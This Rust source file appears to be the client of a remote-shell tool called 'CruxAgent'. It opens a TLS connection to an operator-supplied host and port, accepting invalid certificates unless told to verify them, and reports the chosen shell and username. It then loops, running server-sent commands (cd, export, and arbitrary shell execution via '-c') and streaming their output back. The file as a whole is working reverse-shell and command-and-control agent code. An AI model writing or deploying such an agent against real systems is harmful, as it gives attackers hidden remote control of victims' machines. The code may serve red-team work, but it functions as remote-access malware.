mod args;
mod agent_utils;
#[path = "../utils/mod.rs"]
mod utils;

// crates
use native_tls::{TlsConnector, TlsStream};
use clap::error::Result;
use clap::{Parser};
use whoami;
use serde_json;
use subprocess::{Exec, Redirection};

// std
use std::env;
use std::net::{TcpStream};
use std::io::Read;

// My stuff
use args::CruxAgentArgs;
use utils::data::{CmdType, Message};
use utils::network::{write_length_prefix, read_length_prefix};
use utils::shell_var::parse_var_def;

fn send_response(cmd_output: &Message, stream: &mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
    // Serialize CmdResult
    let result_str = serde_json::to_string(cmd_output)?;
    write_length_prefix(stream, result_str.as_bytes())?;
    Ok(())
}

fn handle_cd(id:u64, path: &str) -> Result<Message, Box<dyn std::error::Error>> {
    let new_dir = match path {
        "" => env::var("HOME").unwrap_or("/".to_string()), // Home directory
        _ => path.to_string()
    };
    env::set_current_dir(new_dir)?;
    return Ok(Message::CmdExit { id: id, status: 0 })
}

fn handle_export(id: u64, def: &str) -> Result<Message, Box<dyn std::error::Error>> {
    let var_tuple = parse_var_def(def)?;
    unsafe {
        env::set_var(var_tuple.0, var_tuple.1);
    }
    return Ok(Message::CmdExit { id: id, status: 0 })
}

fn handle_exec(id: u64, shell_path: &str, cmd: &str, stream: &mut TlsStream<TcpStream>) -> Result<Message, Box<dyn std::error::Error>> {
    let mut cmd_output;
    let mut popen = Exec::cmd(shell_path)
        .arg("-c")
        .arg(cmd)
        .stdout(Redirection::Pipe)
        .stderr(Redirection::Merge)
        .popen()?;
    if let Some(mut out) = popen.stdout.take(){
        let mut buf = [0u8; 512];
        loop{
            match out.read(&mut buf)?{
                0 => break,
                n => {
                    cmd_output = Message::CmdOutput { id: 0, data: buf[..n].to_vec() };
                    send_response(&cmd_output, stream)?;
                }
            }
        }
    }
    // Wait for exit
    let status = popen.wait()?;
    return Ok(Message::CmdExit { id: id, status: agent_utils::normalize_exit_code(status) });
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli_args = CruxAgentArgs::parse();

    // Connect to CruxServer via TLS
    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(!cli_args.verify_cert)
        .build().unwrap();

    let ip_str = format!("{}:{}", cli_args.rhost, cli_args.rport);
    let stream = TcpStream::connect(ip_str)?;
    let mut stream = connector.connect(&cli_args.rhost.to_string(), stream)?;

    let shell_path = agent_utils::choose_shell()?;
    agent_utils::send_metadata(&shell_path, &mut stream)?;

    // Set User environment variable
    unsafe {
        env::set_var("USER", &whoami::username());
    }

    loop {
        let received_msg_vec = match read_length_prefix(&mut stream){
            Ok(c) => c,
            Err(_) => continue
        };
        let received_msg: Message = match serde_json::from_slice(&received_msg_vec) {
            Ok(c) => c,
            Err(_) => continue
        };

        let mut cmd_output = Message::CmdOutput { id: 0, data: vec![] };
        match received_msg {
            Message::Cmd { id, cmd_type, args } => {
                match cmd_type {
                    CmdType::Exit =>{
                        break
                    }
                    CmdType::Cd =>{
                        match handle_cd(id, &args) {
                            Ok(cmd_exit) => {
                                if let Err(_) = send_response(&cmd_exit, &mut stream) {
                                    break;
                                }
                            }
                            Err(e) =>{
                                let cmd_error = Message::CmdError { id: id, error: format!("Execution Error from CruxAgent: {}", e) };
                                if let Err(_) = send_response(&cmd_error, &mut stream){
                                    break;
                                }
                            }
                        }
                    }
                    CmdType::Export =>{
                        match handle_export(id, &args) {
                            Ok(cmd_exit) => {
                                if let Err(_) = send_response(&cmd_exit, &mut stream) {
                                    break;
                                }
                            }
                            Err(e) =>{
                                let cmd_error = Message::CmdError { id: id, error: format!("Execution Error from CruxAgent: {}", e) };
                                if let Err(_) = send_response(&cmd_error, &mut stream){
                                    break;
                                }
                            }
                        }
                    }
                    CmdType::Exec => {
                        match handle_exec(id, &shell_path, &args, &mut stream) {
                            Ok(cmd_exit) => {
                                if let Err(_) = send_response(&cmd_exit, &mut stream) {
                                    break;
                                }
                            }
                            Err(e) =>{
                                let cmd_error = Message::CmdError { id: id, error: format!("Execution Error from CruxAgent: {}", e) };
                                if let Err(_) = send_response(&cmd_error, &mut stream){
                                    break;
                                }
                            }
                        }
                    }
                    _ => {}
                }
            }
            Message::Kill { id:_ } => {
                continue
            }
            _ => {
                continue
            }
        }
    }
    stream.shutdown()?;
    Ok(())
}
